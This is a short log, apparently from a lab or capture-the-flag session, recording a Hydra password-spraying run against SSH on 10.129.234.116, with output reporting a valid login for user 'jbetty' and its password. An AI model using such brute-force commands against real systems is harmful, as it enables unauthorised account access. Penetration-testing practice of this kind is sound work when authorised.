@@ -1,0 +1,15 @@
+### [2026-04-18 11:03:02] hydra -L usernames.txt -p Texas123!@# ssh://10.129.234.116 -t 4
+
+$ hydra -L usernames.txt -p Texas123!@# ssh://10.129.234.116 -t 4
+
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-18 11:03:03
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:15/p:1), ~4 tries per task
+[DATA] attacking ssh://10.129.234.116:22/
+[22][ssh] host: 10.129.234.116   misc: (null)   login: jbetty   password: Texas123!@#
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-18 11:03:23
+
+# Exit code: 0
+# Duration: 2026-04-18 11:03:23
